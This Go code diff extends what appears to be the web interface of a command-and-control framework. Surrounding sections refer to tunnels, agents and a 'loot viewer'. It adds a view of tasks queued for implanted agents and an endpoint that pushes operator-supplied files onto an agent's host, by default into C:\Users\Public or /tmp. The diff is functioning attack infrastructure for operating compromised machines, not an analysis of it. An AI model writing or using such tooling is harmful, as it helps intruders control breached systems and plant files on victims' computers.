@@ -72,6 +72,105 @@ func (w *WebUI) handleTunnelList(rw http.ResponseWriter, r *http.Request) {
 }
 
 // ══════════════════════════════════════════
+//  TASK QUEUE VIEWER
+// ══════════════════════════════════════════
+
+func (w *WebUI) handleTaskQueue(rw http.ResponseWriter, r *http.Request) {
+	agents, _ := w.server.AgentMgr.List()
+
+	type pendingTask struct {
+		Agent   string `json:"agent"`
+		TaskID  string `json:"task_id"`
+		Type    string `json:"type"`
+		Args    string `json:"args"`
+		Status  string `json:"status"`
+		Created string `json:"created"`
+	}
+
+	var pending []pendingTask
+	for _, a := range agents {
+		tasks, _ := w.server.TaskDisp.GetTaskHistory(a.ID)
+		for _, t := range tasks {
+			status := protocol.StatusName(uint8(t.Status))
+			if status == "pending" || status == "sent" {
+				pending = append(pending, pendingTask{
+					Agent:   a.Name,
+					TaskID:  util.ShortID(t.ID),
+					Type:    protocol.TaskTypeName(uint8(t.Type)),
+					Args:    strings.Join(t.Args, " "),
+					Status:  status,
+					Created: util.TimeAgo(t.CreatedAt),
+				})
+			}
+		}
+	}
+	if pending == nil {
+		pending = []pendingTask{}
+	}
+	writeJSON(rw, pending)
+}
+
+// ══════════════════════════════════════════
+//  FILE UPLOAD TO AGENT
+// ══════════════════════════════════════════
+
+func (w *WebUI) handleUploadToAgent(rw http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(rw, "POST required", 405)
+		return
+	}
+
+	r.ParseMultipartForm(32 << 20) // 32MB max
+
+	agentRef := r.FormValue("agent")
+	remotePath := r.FormValue("remote_path")
+	file, header, err := r.FormFile("file")
+	if err != nil {
+		writeJSON(rw, map[string]string{"error": "file required"})
+		return
+	}
+	defer file.Close()
+
+	if agentRef == "" {
+		writeJSON(rw, map[string]string{"error": "agent required"})
+		return
+	}
+
+	agent, _ := w.server.AgentMgr.Get(agentRef)
+	if agent == nil {
+		writeJSON(rw, map[string]string{"error": "agent not found"})
+		return
+	}
+
+	// Read file data
+	data := make([]byte, header.Size)
+	file.Read(data)
+
+	if remotePath == "" {
+		if agent.OS == "windows" {
+			remotePath = "C:\\Users\\Public\\" + header.Filename
+		} else {
+			remotePath = "/tmp/" + header.Filename
+		}
+	}
+
+	// Create upload task
+	task, err := w.server.TaskDisp.CreateTask(agent.ID, protocol.TaskUpload, []string{remotePath}, data)
+	if err != nil {
+		writeJSON(rw, map[string]string{"error": err.Error()})
+		return
+	}
+
+	writeJSON(rw, map[string]interface{}{
+		"status":      "queued",
+		"task_id":     task.ID,
+		"filename":    header.Filename,
+		"remote_path": remotePath,
+		"size":        header.Size,
+	})
+}
+
+// ══════════════════════════════════════════
 //  LOOT VIEWER
 // ══════════════════════════════════════════
 
